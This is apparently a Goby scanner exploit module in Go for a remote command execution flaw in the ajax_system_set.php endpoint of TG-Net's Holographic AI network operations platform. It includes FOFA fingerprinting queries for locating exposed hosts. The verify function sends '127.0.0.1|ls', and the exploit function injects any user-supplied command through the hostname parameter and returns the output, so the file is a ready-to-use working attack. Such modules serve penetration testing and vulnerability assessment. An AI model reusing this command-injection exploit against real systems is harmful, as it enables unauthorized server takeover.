package exploits

import (
	"encoding/json"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "TG-Net Holographic AI Network Operation and maintenance platform RCE",
    "Description": "Wanwang Broadcom Holographic AI weak current network integrated operation and maintenance platform has achieved zero breakthroughs in weak current intelligent AI network. Wanwang Broadcom Holographic AI network operation and maintenance platform ajax_system_set.php has a remote command execution vulnerability. By constructing an http request, an attacker can execute code at will on the server side, write it later, obtain server permissions, and gain control of the entire web server.",
    "Impact": "TG-Net Holographic AI Network Operation and maintenance platform RCE",
    "Recommendation": "<p>The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.tg-net.cn/product/quanxiaipingtai.html\">http://www.tg-net.cn/product/quanxiaipingtai.html</a></p><p>1. If not necessary, it is forbidden to access the device from the public network. </p><p>2. Set access policies and whitelist access through firewalls and other security devices</p>",
    "Product": "TG-Net-Holographic-AI",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "万网博通全息 AI 网络运维平台 ajax_system_set.php 文件 远程命令执行漏洞",
            "Description": "<p>万网博通全息AI弱电网络综合运维平台实现了弱电智能化AI网络零突破。</p><p>万网博通全息AI网络运维平台ajax_system_set.php存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Impact": "<p>万网博通全息AI网络运维平台ajax_system_set.php存在远程命令执行漏洞，通过构造http请求，攻击者可以在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.tg-net.cn/product/quanxiaipingtai.html\" rel=\"nofollow\">http://www.tg-net.cn/product/quanxiaipingtai.html</a><br></p><p>1、如⾮必要，禁⽌公⽹访问该设备。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问<br><br></p>",
            "Product": "万网博通全息AI网络运维平台",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "TG-Net Holographic AI Network Operation and maintenance platform RCE",
            "Description": "Wanwang Broadcom Holographic AI weak current network integrated operation and maintenance platform has achieved zero breakthroughs in weak current intelligent AI network. Wanwang Broadcom Holographic AI network operation and maintenance platform ajax_system_set.php has a remote command execution vulnerability. By constructing an http request, an attacker can execute code at will on the server side, write it later, obtain server permissions, and gain control of the entire web server.",
            "Impact": "TG-Net Holographic AI Network Operation and maintenance platform RCE",
            "Recommendation": "<p>The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.tg-net.cn/product/quanxiaipingtai.html\" rel=\"nofollow \">http://www.tg-net.cn/product/quanxiaipingtai.html</a><br></p><p>1. If not necessary, it is forbidden to access the device from the public network. </p><p>2. Set access policies and whitelist access through firewalls and other security devices<br><br></p>",
            "Product": "TG-Net-Holographic-AI",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "body=\"/nmss/index/css/index.css\"",
    "GobyQuery": "body=\"/nmss/index/css/index.css\"",
    "Author": "go0p",
    "Homepage": "http://www.tg-net.cn/product/quanxiaipingtai.html",
    "DisclosureDate": "2021-07-30",
    "References": [
        "https://mp.weixin.qq.com/s/u6pbwDQ7gnc4gCcUOXKRYQ"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ifconfig",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "TG-Net-Holographic-AI"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/nmss/toolMenu/Ajax/ajax_system_set.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Data = "cmd=ping_hostname&hostname=127.0.0.1|ls&packet_size=56&count=4&haveEn=1"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				re := regexp.MustCompile("\\[\"(.*?)\"\\]")
				resp.RawBody = re.FindStringSubmatch(resp.Utf8Html)[1]
				if resp.RawBody != "" && resp.StatusCode == 200 {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cmd = url.QueryEscape(cmd)
			cfg := httpclient.NewPostRequestConfig("/nmss/toolMenu/Ajax/ajax_system_set.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Data = "cmd=ping_hostname&hostname=127.0.0.1|" + cmd + "&packet_size=56&count=4&haveEn=1"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Success = true
				var resArr []string
				if err := json.Unmarshal([]byte(resp.RawBody), &resArr); err == nil {
					for _, v := range resArr {
						expResult.Output += v + "\n"
					}
				}
			}
			return expResult
		},
	))
}
